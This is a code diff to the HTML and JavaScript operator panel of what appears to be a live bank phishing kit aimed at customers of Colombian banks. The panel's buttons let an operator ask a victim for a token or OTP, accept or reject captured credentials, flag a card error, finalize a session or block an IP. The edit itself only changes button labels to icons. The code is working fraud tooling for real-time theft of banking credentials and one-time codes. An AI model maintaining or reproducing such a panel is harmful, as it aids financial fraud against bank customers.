@@ -302,7 +302,7 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
             </div>
         </div>
 
-        <!-- 🔥 NUEVA PESTAÑA HISTORIAL -->
+        <!-- 🔥 PESTAÑA HISTORIAL -->
         <div class="tab-content" id="tab-historial">
             <div class="section">
                 <div class="section-header">
@@ -670,15 +670,15 @@ function botonesSesion(s) {
 
     if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
         if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
-            btns.push(`<button class="btn btn-accept" onclick="accion('${sid}','ACEPTAR')">✅ Aceptar</button>`);
+            btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
         }
         if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
-            btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+            btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         }
         if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
-            btns.push(`<button class="btn" style="background:#f59e0b; color:white;" onclick="accion('${sid}','CC_ERROR')">⚠️ CC Error</button>`);
+            btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="CC Error" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
         }
-        btns.push(`<button class="btn btn-block" onclick="bloquearIp('${ip}')">🚫 IP</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
 
@@ -687,27 +687,27 @@ function botonesSesion(s) {
 
     if (estado === 'pendiente') {
         if (bancoKey === 'bogota') {
-            btns.push(`<button class="btn btn-token" onclick="accion('${sid}','TOKEN')">🔢 Token</button>`);
+            btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
         } else if (bancosSoloOtp.includes(bancoKey)) {
-            btns.push(`<button class="btn btn-otp" onclick="accion('${sid}','OTP')">📱 OTP</button>`);
+            btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         } else if (bancosTokenOtp.includes(bancoKey)) {
-            btns.push(`<button class="btn btn-token" onclick="accion('${sid}','TOKEN')">🔢 Token</button>`);
-            btns.push(`<button class="btn btn-otp" onclick="accion('${sid}','OTP')">📱 OTP</button>`);
+            btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
+            btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         }
-        btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
     } else if (estado === 'otp' || estado === 'token') {
-        btns.push(`<button class="btn btn-final" onclick="accion('${sid}','FINALIZAR')">✅ Finalizar</button>`);
+        btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
         if (estado === 'otp' && bancoKey !== 'bogota') {
-            btns.push(`<button class="btn btn-token" onclick="accion('${sid}','TOKEN')">🔢 Token</button>`);
+            btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
         } else if (estado === 'token' && bancosTokenOtp.includes(bancoKey)) {
-            btns.push(`<button class="btn btn-otp" onclick="accion('${sid}','OTP')">📱 OTP</button>`);
+            btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         }
-        btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
     } else if (estado === 'aceptado') {
-        btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
     }
 
-    btns.push(`<button class="btn btn-block" onclick="bloquearIp('${ip}')">🚫 IP</button>`);
+    btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
 
     return btns.join('');
 }
